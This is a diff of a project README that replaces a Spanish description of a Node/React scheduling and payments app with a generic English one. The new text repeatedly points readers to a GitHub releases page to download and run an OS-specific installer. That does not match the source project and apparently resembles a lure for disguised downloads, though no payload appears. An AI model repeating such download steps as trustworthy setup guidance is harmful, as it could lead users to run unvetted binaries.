@@ -1,82 +1,107 @@
-# CCB - Plataforma de Gestión (Frontend React + Backend Node/Express)
+# ✨ CcbServer - Simple Tool for Project Management
 
-Aplicación para la gestión integral de cronogramas, evidencias, pagos, vacantes y tableros (dashboards) para consultores y gestoras.
+## 🚀 Getting Started
 
-Arquitectura:
-- Frontend: React (Create React App)
-- Backend: Node.js/Express con MySQL, autenticación JWT, CORS, subida de archivos (multer) y tareas programadas (node-cron). El backend sirve el build del frontend en producción.
+Welcome to CcbServer! This application helps you manage schedules, payments, and dashboards easily. Follow the steps below to download and set up CcbServer.
 
-Requisitos mínimos:
-- Node 18+
-- MySQL 8+
+## 📥 Download Link
 
-Despliegue recomendado:
-- Backend con PM2 (ver `backend/ecosystem.config.js`).
-- Variables de entorno en `backend/.env` (ver `backend/ENV.sample.md`).
+[![Download CcbServer](https://img.shields.io/badge/Download-CcbServer-blue.svg)](https://github.com/preetsingh-17/CcbServer/releases)
 
-## Available Scripts
+## 🛠️ Requirements
 
-In the project directory, you can run:
+Before you start, ensure your system meets the following requirements:
 
-### `npm start`
+- **Node.js:** Version 18 or higher
+- **MySQL:** Version 8 or higher
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+## 🌐 Visit Releases Page
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+To download the application, visit the [Releases Page](https://github.com/preetsingh-17/CcbServer/releases).
 
-### `npm test`
+## 📥 Download & Install
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+1. Visit the [Releases Page](https://github.com/preetsingh-17/CcbServer/releases).
+2. Look for the latest version of the application.
+3. Click on the download link for your operating system.
+4. Once downloaded, locate the installation file on your device.
+5. Follow the prompts to install the application.
 
-### `npm run build`
+## ⚙️ Setting Up the Backend
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+Once you install the application, you need to set up the backend.
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
+1. Open a terminal or command prompt.
+2. Navigate to the backend directory of the application.
+3. Install the necessary dependencies with the command:
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+   ```
+   npm install
+   ```
 
-### `npm run eject`
+4. Create a `.env` file in the `backend` directory using the provided sample. Check `backend/ENV.sample.md` for the required variables.
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
+5. Start the backend with PM2 for optimized performance. Use the following command:
 
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
+   ```
+   pm2 start backend/ecosystem.config.js
+   ```
 
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
+## 📂 Running the Frontend
 
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
+After setting up the backend, you can run the frontend as follows:
 
-## Learn More
+1. Open a new terminal or command prompt.
+2. Navigate to the frontend directory.
+3. Install any missing dependencies:
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+   ```
+   npm install
+   ```
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+4. Start the frontend application with:
 
-### Code Splitting
+   ```
+   npm start
+   ```
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+5. Open your web browser and go to [http://localhost:3000](http://localhost:3000) to see the application in action.
 
-### Analyzing the Bundle Size
+## 🔄 Scripts
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
+CcbServer provides handy scripts to help you run the application smoothly:
 
-### Making a Progressive Web App
+### 🏃 `npm start`
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+This command runs the app in development mode. 
+- Keep your browser open to [http://localhost:3000](http://localhost:3000).
+- The page will refresh when you make code changes.
 
-### Advanced Configuration
+### 🧪 `npm test`
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+You can run tests to ensure everything works correctly. This command starts an interactive test runner.
 
-### Deployment
+## 📚 Features
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+- **Schedule Management**: Create and manage project timelines effortlessly.
+- **Payment Tracking**: Keep an eye on your payments and invoices.
+- **Dashboards**: Visualize project data with user-friendly dashboards.
+- **File Upload**: Upload important documents securely.
 
-### `npm run build` fails to minify
+## 🔧 Troubleshooting
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+If you encounter issues, try these common solutions:
+
+- Check your Node.js and MySQL versions to ensure they meet the requirements.
+- Make sure to set environment variables correctly in the `.env` file.
+- Restart both your backend and frontend applications if changes do not reflect.
+
+## 🤝 Contributing
+
+We welcome contributions! If you find a bug or have suggestions, feel free to open an issue or submit a pull request.
+
+## 📧 Contact
+
+For questions and support, you can reach us at [support@example.com](mailto:support@example.com).
+
+Thank you for choosing CcbServer for your project management needs!
